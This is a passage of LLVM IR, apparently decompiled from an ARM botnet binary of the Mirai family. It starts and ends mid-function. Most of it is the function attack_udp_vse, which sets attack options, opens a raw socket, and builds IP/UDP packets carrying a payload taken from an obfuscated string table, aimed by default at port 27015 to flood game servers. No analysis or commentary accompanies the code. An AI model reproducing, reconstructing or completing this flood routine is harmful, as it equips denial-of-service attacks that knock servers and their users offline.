  %v0_b3bc = load i32, i32* %r3.global-to-local, align 4
  %v1_b3bc = inttoptr i32 %v0_b3bc to i8*
  %v2_b3bc = load i8, i8* %v1_b3bc, align 1
  %v1_b3c0 = and i8 %v2_b3bc, -16
  %v1_b3c4 = or i8 %v1_b3c0, 5
  store i32 17, i32* %ip.global-to-local, align 4
  store i8 %v1_b3c4, i8* %v1_b3bc, align 1
  %v0_b3d0 = load i32, i32* %ip.global-to-local, align 4
  %v1_b3d0 = trunc i32 %v0_b3d0 to i8
  %v2_b3d0 = load i32, i32* %r3.global-to-local, align 4
  %v3_b3d0 = add i32 %v2_b3d0, 9
  %v4_b3d0 = inttoptr i32 %v3_b3d0 to i8*
  store i8 %v1_b3d0, i8* %v4_b3d0, align 1
  %v2_b3d8 = load i32, i32* %r3.global-to-local, align 4
  %v3_b3d8 = add i32 %v2_b3d8, 1
  %v4_b3d8 = inttoptr i32 %v3_b3d8 to i8*
  store i8 %v5_af00, i8* %v4_b3d8, align 1
  store i32 %v5_af3c, i32* %ip.global-to-local, align 4
  %v0_b3e0 = load i32, i32* %r1.global-to-local, align 4
  %v3_b3e0 = mul i32 %v0_b3e0, 32
  store i32 %v3_b3e0, i32* %r0.global-to-local, align 4
  %v2_b3e4 = load i32, i32* %r3.global-to-local, align 4
  %v3_b3e4 = add i32 %v2_b3e4, 8
  %v4_b3e4 = inttoptr i32 %v3_b3e4 to i8*
  store i8 %v1_b15c, i8* %v4_b3e4, align 1
  %v0_b3e8 = load i32, i32* @sb, align 4
  %v1_b3e8 = load i32, i32* %r3.global-to-local, align 4
  %v2_b3e8 = add i32 %v1_b3e8, 12
  %v3_b3e8 = inttoptr i32 %v2_b3e8 to i32*
  store i32 %v0_b3e8, i32* %v3_b3e8, align 4
  %v0_b3ec = load i32, i32* %r0.global-to-local, align 4
  %v1_b3ec = load i32, i32* %r1.global-to-local, align 4
  %tmp57 = mul i32 %v1_b3ec, -8
  %v5_b3ec = add i32 %v0_b3ec, %tmp57
  %v1_b3f0 = load i32, i32* @r7, align 4
  %v2_b3f0 = add i32 %v5_b3ec, %v1_b3f0
  store i32 %v2_b3f0, i32* %r2.global-to-local, align 4
  %v1_b3f4 = add i32 %v2_b3f0, 16
  %v2_b3f4 = inttoptr i32 %v1_b3f4 to i32*
  %v3_b3f4 = load i32, i32* %v2_b3f4, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v1_b3fc = load i32, i32* %r3.global-to-local, align 4
  %v2_b3fc = add i32 %v1_b3fc, 16
  %v3_b3fc = inttoptr i32 %v2_b3fc to i32*
  store i32 %v3_b3f4, i32* %v3_b3fc, align 4
  store i32 64, i32* %r2.global-to-local, align 4
  %v0_b404 = load i32, i32* %r1.global-to-local, align 4
  %v1_b404 = add i32 %v0_b404, 1
  store i32 %v1_b404, i32* @r4, align 4
  %v0_b408 = load i32, i32* @r6, align 4
  %v1_b408 = trunc i32 %v0_b408 to i16
  %v2_b408 = load i32, i32* %r3.global-to-local, align 4
  %v3_b408 = add i32 %v2_b408, 2
  %v4_b408 = inttoptr i32 %v3_b408 to i16*
  store i16 %v1_b408, i16* %v4_b408, align 2
  %v0_b40c = load i32, i32* %r3.global-to-local, align 4
  %v1_b40c = add i32 %v0_b40c, 20
  store i32 %v1_b40c, i32* %r1.global-to-local, align 4
  %v0_b410 = load i32, i32* @r8, align 4
  %v1_b410 = trunc i32 %v0_b410 to i16
  %v3_b410 = add i32 %v0_b40c, 4
  %v4_b410 = inttoptr i32 %v3_b410 to i16*
  store i16 %v1_b410, i16* %v4_b410, align 2
  %v0_b414 = load i32, i32* %r2.global-to-local, align 4
  %v1_b414 = trunc i32 %v0_b414 to i16
  %v2_b414 = load i32, i32* %r3.global-to-local, align 4
  %v3_b414 = add i32 %v2_b414, 6
  %v4_b414 = inttoptr i32 %v3_b414 to i16*
  store i16 %v1_b414, i16* %v4_b414, align 2
  %v0_b418 = load i32, i32* @sl, align 4
  %v1_b418 = trunc i32 %v0_b418 to i16
  %v2_b418 = load i32, i32* %r3.global-to-local, align 4
  %v3_b418 = add i32 %v2_b418, 20
  %v4_b418 = inttoptr i32 %v3_b418 to i16*
  store i16 %v1_b418, i16* %v4_b418, align 2
  store i32 %v4_b178, i32* %r3.global-to-local, align 4
  %v0_b420 = load i32, i32* @r4, align 4
  %v1_b420 = load i32, i32* %r0.global-to-local, align 4
  %v0_b424 = load i32, i32* @r5, align 4
  %v1_b424 = trunc i32 %v0_b424 to i16
  %v2_b424 = load i32, i32* %r1.global-to-local, align 4
  %v3_b424 = add i32 %v2_b424, 4
  %v4_b424 = inttoptr i32 %v3_b424 to i16*
  store i16 %v1_b424, i16* %v4_b424, align 2
  %v0_b428 = load i32, i32* %r3.global-to-local, align 4
  %v1_b428 = trunc i32 %v0_b428 to i16
  %v2_b428 = load i32, i32* %r1.global-to-local, align 4
  %v3_b428 = add i32 %v2_b428, 2
  %v4_b428 = inttoptr i32 %v3_b428 to i16*
  store i16 %v1_b428, i16* %v4_b428, align 2
  %v0_b42c = load i32, i32* @r4, align 4
  store i32 %v0_b42c, i32* %stack_var_-44, align 4
  %v5_b430 = icmp slt i32 %v0_b420, %v1_b420
  br i1 %v5_b430, label %dec_label_pc_b38c, label %dec_label_pc_b1a4.preheader

dec_label_pc_b438:                                ; preds = %dec_label_pc_b20c, %dec_label_pc_b1a4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_b43c = call i32 @__GI_time(i32* null)
  store i32 %v2_b43c, i32* %r0.global-to-local, align 4
  store i32 %v2_afe0, i32* %r3.global-to-local, align 4
  %v6_b448 = icmp slt i32 %v2_afe0, %v2_b43c
  br i1 %v6_b448, label %dec_label_pc_b44c, label %dec_label_pc_b1a4

dec_label_pc_b44c:                                ; preds = %dec_label_pc_b438, %entry, %dec_label_pc_b458
  %v1_b454 = phi i32 [ %v3_aff4, %entry ], [ %v1_b45c, %dec_label_pc_b458 ], [ %v2_b43c, %dec_label_pc_b438 ]
  store i32 %v27_ae9c, i32* %lr.global-to-local, align 4
  ret i32 %v1_b454

dec_label_pc_b458:                                ; preds = %dec_label_pc_b004
  %v0_b458 = load i32, i32* @fp, align 4
  store i32 %v0_b458, i32* %r0.global-to-local, align 4
  %v1_b45c = call i32 @__GI___libc_close(i32 %v0_b458)
  store i32 %v1_b45c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b44c

; uselistorder directives
  uselistorder i32 %v1_b45c, { 1, 0 }
  uselistorder i32 %v0_b358, { 1, 0 }
  uselistorder i32 %v0_b344, { 1, 0 }
  uselistorder i32 %v1_b33c, { 1, 0 }
  uselistorder i32 %v5_b304, { 1, 0 }
  uselistorder i32 %v3_b2b8, { 2, 1, 3, 0 }
  uselistorder i32 %v1_b284, { 1, 2, 0, 3 }
  uselistorder i32 %v5_b24c, { 1, 0 }
  uselistorder i32 %v4_b23c, { 1, 0 }
  uselistorder i32 %v0_b22c, { 1, 0, 2 }
  uselistorder i32 %v2_b21c, { 1, 0 }
  uselistorder i1 %v2_b360, { 1, 0 }
  uselistorder i32 %v1_b164, { 1, 0 }
  uselistorder i32 %v3_b0e0, { 1, 0 }
  uselistorder i32 %v3_b0dc, { 1, 0 }
  uselistorder i32 %v3_b0d8, { 1, 0 }
  uselistorder i32 %v1_b098, { 2, 3, 1, 0 }
  uselistorder i32 %v1_b094, { 3, 4, 2, 0, 1 }
  uselistorder i32 %v3_b068, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %v3_b05c, { 1, 0 }
  uselistorder i32 %v0_b048, { 0, 4, 5, 6, 3, 7, 8, 1, 2 }
  uselistorder i32 %v3_aff4, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_afe0, { 1, 0 }
  uselistorder i32 %v1_afbc, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_af7c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_af48, { 2, 1, 0 }
  uselistorder i32 %v5_af3c, { 0, 2, 1 }
  uselistorder i32 %v7_af04, { 1, 0, 2, 3 }
  uselistorder i32 %v6_aee0, { 1, 2, 0 }
  uselistorder i32 %v2_aec8, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 12, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 23, 18, 19, 20, 21, 22, 24, 25, 26, 27, 28, 33, 29, 30, 31, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 13, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 36, 35, 38, 37, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 8, 3, 4, 5, 6, 7, 10, 9, 12, 11, 14, 15, 13, 17, 16, 19, 18, 20, 22, 21, 29, 23, 24, 25, 26, 27, 28, 33, 30, 31, 32, 34, 36, 35, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32 %arg2, { 2, 5, 4, 6, 0, 3, 1, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_b44c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b38c, { 1, 0 }
  uselistorder label %dec_label_pc_b36c, { 1, 0 }
  uselistorder label %dec_label_pc_b20c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b1a4, { 1, 0 }
  uselistorder label %dec_label_pc_b100, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
}

define i32 @attack_udp_vse(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v3_b468 = load i32, i32* @r4, align 4
  %v27_b468 = load i32, i32* @lr, align 4
  store i32 0, i32* @r7, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @fp, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_b494 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_b498 = load i32, i32* @r4, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_b4a0 = load i32, i32* @r7, align 4
  store i32 %v0_b4a0, i32* %r3.global-to-local, align 4
  store i32 %v2_b494, i32* @sb, align 4
  %v0_b4a8 = load i32, i32* @r5, align 4
  %v5_b4ac = inttoptr i32 %v0_b498 to i32*
  %v6_b4ac = call i32 @attack_get_opt_int(i32 %v0_b4a8, i32* %v5_b4ac, i32 2, i32 %v0_b4a0, i32 ptrtoint (i32* @0 to i32))
  %v1_b4b8 = urem i32 %v6_b4ac, 256
  store i32 %v1_b4b8, i32* %ip.global-to-local, align 4
  %v0_b4bc = load i32, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b4c8 = load i32, i32* @r5, align 4
  %v5_b4cc = trunc i32 %v6_b4ac to i8
  %v6_b4d0 = inttoptr i32 %v0_b4bc to i32*
  %v7_b4d0 = call i32 @attack_get_opt_int(i32 %v0_b4c8, i32* %v6_b4d0, i32 3, i32 65535, i32 %v6_b4ac)
  %v0_b4d4 = load i32, i32* @r4, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_b4e4 = load i32, i32* @r5, align 4
  %v5_b4e8 = inttoptr i32 %v0_b4d4 to i32*
  %v6_b4e8 = call i32 @attack_get_opt_int(i32 %v0_b4e4, i32* %v5_b4e8, i32 4, i32 64, i32 %v7_b4d0)
  %v0_b4f0 = load i32, i32* @r4, align 4
  %v1_b4f4 = urem i32 %v6_b4e8, 256
  store i32 %v1_b4f4, i32* %ip.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v0_b4fc = load i32, i32* @r7, align 4
  store i32 %v0_b4fc, i32* %r3.global-to-local, align 4
  %v0_b500 = load i32, i32* @r5, align 4
  %sext5 = mul i32 %v6_b4e8, 16777216
  %v5_b508 = sdiv i32 %sext5, 16777216
  %v6_b508 = inttoptr i32 %v0_b4f0 to i32*
  %v7_b508 = call i32 @attack_get_opt_int(i32 %v0_b500, i32* %v6_b508, i32 5, i32 %v0_b4fc, i32 %v5_b508)
  %v1_b514 = urem i32 %v7_b508, 256
  store i32 %v1_b514, i32* %ip.global-to-local, align 4
  %v0_b518 = load i32, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_b524 = load i32, i32* @r5, align 4
  %v5_b52c = inttoptr i32 %v0_b518 to i32*
  %v6_b52c = call i32 @attack_get_opt_int(i32 %v0_b524, i32* %v5_b52c, i32 6, i32 65535, i32 %v1_b514)
  %v0_b534 = load i32, i32* @r4, align 4
  store i32 27015, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_b544 = load i32, i32* @r5, align 4
  %v5_b548 = inttoptr i32 %v0_b534 to i32*
  %v6_b548 = call i32 @attack_get_opt_int(i32 %v0_b544, i32* %v5_b548, i32 7, i32 27015, i32 %v6_b52c)
  store i32 %v6_b548, i32* @r4, align 4
  %v0_b550 = load i32, i32* @r7, align 4
  store i32 %v0_b550, i32* %stack_var_-48, align 4
  %v1_b558 = inttoptr i32 %v0_b550 to i32*
  %v2_b558 = call i32 @__GI_time(i32* %v1_b558)
  %v1_b55c = load i32, i32* @r6, align 4
  %v2_b55c = add i32 %v1_b55c, %v2_b558
  %v1_b568 = call i32 @table_unlock_val(i32 14)
  %v3_b574 = call i32 @table_retrieve_val(i32 14, i32* nonnull %stack_var_-48)
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_b588 = call i32 @socket(i32 2, i32 3, i32 17)
  %v7_b58c = icmp eq i32 %v3_b588, -1
  store i32 %v3_b588, i32* @sl, align 4
  br i1 %v7_b58c, label %dec_label_pc_b8b8, label %dec_label_pc_b598

dec_label_pc_b598:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_b5a0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_b5a0, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_b5a8 = load i32, i32* @r7, align 4
  store i32 %v0_b5a8, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_b5b4 = call i32 @__GI_setsockopt(i32 %v3_b588, i32 %v0_b5a8, i32 3, i32 %v6_b5a0, i32 ptrtoint (i32* @0 to i32))
  %v7_b5b8 = icmp eq i32 %v5_b5b4, -1
  br i1 %v7_b5b8, label %dec_label_pc_b8c4, label %dec_label_pc_b5c0

dec_label_pc_b5c0:                                ; preds = %dec_label_pc_b598
  store i32 %v6_b52c, i32* %r2.global-to-local, align 4
  %v0_b5cc = load i32, i32* @r4, align 4
  %v3_b5d0 = mul i32 %v6_b52c, 65536
  store i32 %v3_b5d0, i32* %ip.global-to-local, align 4
  %v3_b5d4 = urem i32 %v7_b4d0, 65536
  store i32 %v3_b5d4, i32* %r3.global-to-local, align 4
  %v3_b5d8 = urem i32 %v6_b52c, 65536
  %v3_b5dc = urem i32 %v0_b5cc, 65536
  %v0_b5e0 = load i32, i32* @fp, align 4
  %v2_b5e0 = icmp eq i32 %v0_b5e0, 0
  %v0_b5e4 = load i32, i32* @r7, align 4
  store i32 %v0_b5e4, i32* %stack_var_-44, align 4
  br i1 %v2_b5e0, label %dec_label_pc_b724.preheader, label %dec_label_pc_b5f8

dec_label_pc_b5f8:                                ; preds = %dec_label_pc_b5c0
  %tmp38 = mul i32 %v7_b4d0, 256
  %v3_b600 = and i32 %tmp38, 65280
  store i32 %v3_b600, i32* %r3.global-to-local, align 4
  %tmp39 = mul i32 %v0_b5cc, 256
  %v3_b604 = and i32 %tmp39, 65280
  %tmp40 = udiv i32 %v7_b4d0, 256
  %v4_b60c = urem i32 %tmp40, 256
  %v5_b60c = or i32 %v4_b60c, %tmp38
  %tmp41 = udiv i32 %v0_b5cc, 256
  %v4_b610 = urem i32 %tmp41, 256
  %v5_b610 = or i32 %v4_b610, %v3_b604
  store i32 %v5_b610, i32* @lr, align 4
  %tmp42 = mul i32 %v6_b52c, 256
  %v3_b614 = and i32 %tmp42, 65280
  store i32 %v3_b614, i32* %r2.global-to-local, align 4
  %v5_b618 = trunc i32 %v5_b60c to i16
  %tmp43 = udiv i32 %v6_b52c, 256
  %v4_b620 = urem i32 %tmp43, 256
  %v5_b620 = or i32 %v4_b620, %v3_b614
  store i32 %v5_b620, i32* @r6, align 4
  store i32 %v0_b5e4, i32* @r4, align 4
  %sext = mul nuw i32 %v5_b610, 65536
  %v4_b6f0 = sdiv i32 %sext, 65536
  %v1_b69c = trunc i32 %v5_b508 to i8
  br label %dec_label_pc_b628

dec_label_pc_b628:                                ; preds = %.thread, %dec_label_pc_b5f8
  %v2_b630 = call i32 @calloc(i32 128, i32 1)
  %v3_b634 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b634, i32* %r2.global-to-local, align 4
  %v1_b638 = load i32, i32* @sb, align 4
  %v2_b638 = load i32, i32* @r4, align 4
  %v5_b638 = mul i32 %v2_b638, 4
  %v6_b638 = add i32 %v5_b638, %v1_b638
  %v7_b638 = inttoptr i32 %v6_b638 to i32*
  store i32 %v2_b630, i32* %v7_b638, align 4
  %v0_b63c = load i32, i32* %r2.global-to-local, align 4
  %v3_b63c = mul i32 %v0_b63c, 32
  store i32 %v3_b63c, i32* %r3.global-to-local, align 4
  %v0_b640 = load i32, i32* @sb, align 4
  %v4_b640 = mul i32 %v0_b63c, 4
  %v5_b640 = add i32 %v0_b640, %v4_b640
  %v6_b640 = inttoptr i32 %v5_b640 to i32*
  %v7_b640 = load i32, i32* %v6_b640, align 4
  store i32 %v7_b640, i32* @lr, align 4
  %v5_b644 = mul i32 %v0_b63c, 24
  store i32 %v5_b644, i32* %r3.global-to-local, align 4
  %v1_b648 = load i32, i32* @r8, align 4
  %v2_b648 = add i32 %v1_b648, %v5_b644
  store i32 %v2_b648, i32* @r5, align 4
  %v1_b64c = inttoptr i32 %v7_b640 to i8*
  %v2_b64c = load i8, i8* %v1_b64c, align 1
  %tmp = urem i8 %v2_b64c, 16
  %v1_b650 = zext i8 %tmp to i32
  %v1_b654 = or i32 %v1_b650, 64
  store i32 %v1_b654, i32* %r3.global-to-local, align 4
  %v1_b65c = trunc i32 %v1_b654 to i8
  store i8 %v1_b65c, i8* %v1_b64c, align 1
  %v0_b660 = load i32, i32* @lr, align 4
  %v1_b660 = inttoptr i32 %v0_b660 to i8*
  %v2_b660 = load i8, i8* %v1_b660, align 1
  %v1_b664 = and i8 %v2_b660, -16
  %v1_b668 = or i8 %v1_b664, 5
  store i8 %v1_b668, i8* %v1_b660, align 1
  %v2_b674 = load i32, i32* @lr, align 4
  %v3_b674 = add i32 %v2_b674, 1
  %v4_b674 = inttoptr i32 %v3_b674 to i8*
  store i8 %v5_b4cc, i8* %v4_b674, align 1
  %v3_b678 = load i32, i32* %stack_var_-48, align 4
  %v3_b67c = mul i32 %v3_b678, 65536
  %v1_b680 = add i32 %v3_b67c, 2097152
  %v3_b684 = udiv i32 %v1_b680, 256
  %v1_b688 = and i32 %v3_b684, 65280
  %v4_b68c = udiv i32 %v1_b680, 16777216
  %v5_b68c = or i32 %v1_b688, %v4_b68c
  store i32 %v5_b68c, i32* %r3.global-to-local, align 4
  store i32 %v1_b514, i32* %r4.global-to-local, align 4
  %v3_b698 = urem i32 %v3_b678, 65536
  store i32 %v3_b698, i32* %r2.global-to-local, align 4
  %v2_b69c = load i32, i32* @lr, align 4
  %v3_b69c = add i32 %v2_b69c, 8
  %v4_b69c = inttoptr i32 %v3_b69c to i8*
  store i8 %v1_b69c, i8* %v4_b69c, align 1
  %v0_b6a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b6a0 = trunc i32 %v0_b6a0 to i16
  %v2_b6a0 = load i32, i32* @lr, align 4
  %v3_b6a0 = add i32 %v2_b6a0, 2
  %v4_b6a0 = inttoptr i32 %v3_b6a0 to i16*
  store i16 %v1_b6a0, i16* %v4_b6a0, align 2
  %v0_b6a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_b6a4 = mul i32 %v0_b6a4, 65536
  %v3_b6ac = add i32 %v1_b6a4, 786432
  store i32 %v3_b6ac, i32* %r2.global-to-local, align 4
  %v2_b6b0 = load i32, i32* @lr, align 4
  %v3_b6b0 = add i32 %v2_b6b0, 4
  %v4_b6b0 = inttoptr i32 %v3_b6b0 to i16*
  store i16 %v5_b618, i16* %v4_b6b0, align 2
  %v0_b6b4 = load i32, i32* %r2.global-to-local, align 4
  %v3_b6b4 = udiv i32 %v0_b6b4, 256
  %v1_b6b8 = and i32 %v3_b6b4, 65280
  %v4_b6bc = udiv i32 %v0_b6b4, 16777216
  %v5_b6bc = or i32 %v1_b6b8, %v4_b6bc
  store i32 %v5_b6bc, i32* %ip.global-to-local, align 4
  %v2_b6c4 = load i32, i32* @lr, align 4
  %v3_b6c4 = add i32 %v2_b6c4, 9
  %v4_b6c4 = inttoptr i32 %v3_b6c4 to i8*
  store i8 17, i8* %v4_b6c4, align 1
  %v0_b6c8 = load i32, i32* %r4.global-to-local, align 4
  %v2_b6c8 = icmp eq i32 %v0_b6c8, 0
  store i32 ptrtoint (i32* @global_var_23a2c.55 to i32), i32* %r3.global-to-local, align 4
  br i1 %v2_b6c8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_b628
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_b6d4 = load i32, i32* @lr, align 4
  %v4_b6d4 = add i32 %v3_b6d4, 6
  %v5_b6d4 = inttoptr i32 %v4_b6d4 to i16*
  store i16 64, i16* %v5_b6d4, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_b628, %bb
  %v2_b6d8 = load i32, i32* @global_var_23a2c.55, align 4
  store i32 %v2_b6d8, i32* %r2.global-to-local, align 4
  %v1_b6dc = load i32, i32* @lr, align 4
  %v2_b6dc = add i32 %v1_b6dc, 12
  %v3_b6dc = inttoptr i32 %v2_b6dc to i32*
  store i32 %v2_b6d8, i32* %v3_b6dc, align 4
  %v0_b6e0 = load i32, i32* @r5, align 4
  %v1_b6e0 = add i32 %v0_b6e0, 16
  %v2_b6e0 = inttoptr i32 %v1_b6e0 to i32*
  %v3_b6e0 = load i32, i32* %v2_b6e0, align 4
  store i32 %v3_b6e0, i32* %r3.global-to-local, align 4
  %v0_b6e4 = load i32, i32* @lr, align 4
  %v1_b6e4 = add i32 %v0_b6e4, 20
  store i32 %v1_b6e4, i32* %r4.global-to-local, align 4
  %v0_b6e8 = load i32, i32* %ip.global-to-local, align 4
  %v1_b6e8 = trunc i32 %v0_b6e8 to i16
  %v3_b6e8 = add i32 %v0_b6e4, 24
  %v4_b6e8 = inttoptr i32 %v3_b6e8 to i16*
  store i16 %v1_b6e8, i16* %v4_b6e8, align 2
  %v0_b6ec = load i32, i32* %r3.global-to-local, align 4
  %v1_b6ec = load i32, i32* @lr, align 4
  %v2_b6ec = add i32 %v1_b6ec, 16
  %v3_b6ec = inttoptr i32 %v2_b6ec to i32*
  store i32 %v0_b6ec, i32* %v3_b6ec, align 4
  store i32 %v4_b6f0, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_b6f8 = load i32, i32* @lr, align 4
  %v2_b6f8 = add i32 %v1_b6f8, 28
  %v3_b6f8 = inttoptr i32 %v2_b6f8 to i32*
  store i32 -1, i32* %v3_b6f8, align 4
  %v0_b6fc = load i32, i32* %ip.global-to-local, align 4
  %v1_b6fc = trunc i32 %v0_b6fc to i16
  %v2_b6fc = load i32, i32* %r4.global-to-local, align 4
  %v3_b6fc = add i32 %v2_b6fc, 2
  %v4_b6fc = inttoptr i32 %v3_b6fc to i16*
  store i16 %v1_b6fc, i16* %v4_b6fc, align 2
  %v0_b700 = load i32, i32* @lr, align 4
  %v1_b700 = add i32 %v0_b700, 32
  %v0_b704 = load i32, i32* @r6, align 4
  %v1_b704 = trunc i32 %v0_b704 to i16
  %v3_b704 = add i32 %v0_b700, 20
  %v4_b704 = inttoptr i32 %v3_b704 to i16*
  store i16 %v1_b704, i16* %v4_b704, align 2
  %v3_b708 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_b708, i32* %r2.global-to-local, align 4
  %v3_b70c = call i32 @util_memcpy(i32 %v1_b700, i32 %v3_b574, i32 %v3_b708)
  %v3_b710 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b710, i32* %r3.global-to-local, align 4
  %v1_b714 = add i32 %v3_b710, 1
  store i32 %v1_b714, i32* @r4, align 4
  %v1_b718 = load i32, i32* @fp, align 4
  store i32 %v1_b714, i32* %stack_var_-44, align 4
  %v5_b720 = icmp slt i32 %v1_b714, %v1_b718
  br i1 %v5_b720, label %dec_label_pc_b628, label %dec_label_pc_b724.preheader

dec_label_pc_b724.preheader:                      ; preds = %.thread, %dec_label_pc_b5c0
  %v0_b728.ph = phi i32 [ 0, %dec_label_pc_b5c0 ], [ %v1_b718, %.thread ]
  %v3_b740 = icmp eq i32 %v3_b5d4, 65535
  br label %dec_label_pc_b724

dec_label_pc_b724:                                ; preds = %dec_label_pc_b724.preheader, %dec_label_pc_b8a4.dec_label_pc_b724_crit_edge
  %v0_b728 = phi i32 [ %v0_b728.pre, %dec_label_pc_b8a4.dec_label_pc_b724_crit_edge ], [ %v0_b728.ph, %dec_label_pc_b724.preheader ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b728 = icmp eq i32 %v0_b728, 0
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b728, label %dec_label_pc_b8a4, label %dec_label_pc_b734

dec_label_pc_b734:                                ; preds = %dec_label_pc_b724
  br label %dec_label_pc_b7e8

dec_label_pc_b73c:                                ; preds = %dec_label_pc_b7e8
  br i1 %v3_b740, label %dec_label_pc_b870, label %dec_label_pc_b748

dec_label_pc_b748:                                ; preds = %dec_label_pc_b810.dec_label_pc_b748_crit_edge, %dec_label_pc_b73c
  %v1_b74c = phi i32 [ %v1_b74c.pre, %dec_label_pc_b810.dec_label_pc_b748_crit_edge ], [ 65535, %dec_label_pc_b73c ]
  store i32 %v3_b5d8, i32* %r2.global-to-local, align 4
  %v9_b74c = icmp eq i32 %v3_b5d8, %v1_b74c
  br i1 %v9_b74c, label %dec_label_pc_b884, label %dec_label_pc_b754

dec_label_pc_b754:                                ; preds = %dec_label_pc_b870.dec_label_pc_b754_crit_edge, %dec_label_pc_b748
  %v1_b758 = phi i32 [ %v1_b758.pre, %dec_label_pc_b870.dec_label_pc_b754_crit_edge ], [ %v1_b74c, %dec_label_pc_b748 ]
  store i32 %v3_b5dc, i32* %r3.global-to-local, align 4
  %v9_b758 = icmp eq i32 %v3_b5dc, %v1_b758
  br i1 %v9_b758, label %dec_label_pc_b898, label %dec_label_pc_b760

dec_label_pc_b760:                                ; preds = %dec_label_pc_b884, %dec_label_pc_b754, %dec_label_pc_b898
  store i32 0, i32* @r4, align 4
  %v2_b768 = load i32, i32* @r5, align 4
  %v3_b768 = add i32 %v2_b768, 10
  %v4_b768 = inttoptr i32 %v3_b768 to i16*
  store i16 0, i16* %v4_b768, align 2
  %v0_b76c = load i32, i32* @r5, align 4
  store i32 %v0_b76c, i32* @r0, align 4
  %v2_b770 = call i32 @checksum_generic(i32 %v0_b76c, i32 20)
  %v3_b770 = trunc i32 %v2_b770 to i16
  %v3_b774 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_b774, i32* %r3.global-to-local, align 4
  %v3_b778 = load i32, i32* @r5, align 4
  %v4_b778 = add i32 %v3_b778, 10
  %v5_b778 = inttoptr i32 %v4_b778 to i16*
  store i16 %v3_b770, i16* %v5_b778, align 2
  %v0_b77c = load i32, i32* @r6, align 4
  store i32 %v0_b77c, i32* @r1, align 4
  %v1_b780 = add i32 %v0_b77c, 4
  %v2_b780 = inttoptr i32 %v1_b780 to i16*
  %v3_b780 = load i16, i16* %v2_b780, align 2
  %v4_b780 = zext i16 %v3_b780 to i32
  store i32 %v4_b780, i32* %r2.global-to-local, align 4
  %v0_b784 = load i32, i32* @r4, align 4
  %v1_b784 = trunc i32 %v0_b784 to i16
  %v3_b784 = add i32 %v0_b77c, 6
  %v4_b784 = inttoptr i32 %v3_b784 to i16*
  store i16 %v1_b784, i16* %v4_b784, align 2
  %v0_b788 = load i32, i32* %r3.global-to-local, align 4
  %v1_b788 = add i32 %v0_b788, 12
  store i32 %v1_b788, i32* %r3.global-to-local, align 4
  %v0_b78c = load i32, i32* @r5, align 4
  %v4_b790 = call i32 @checksum_tcpudp(i32 %v0_b78c, i32 %v0_b77c, i32 %v4_b780, i32 %v1_b788)
  %v5_b790 = trunc i32 %v4_b790 to i16
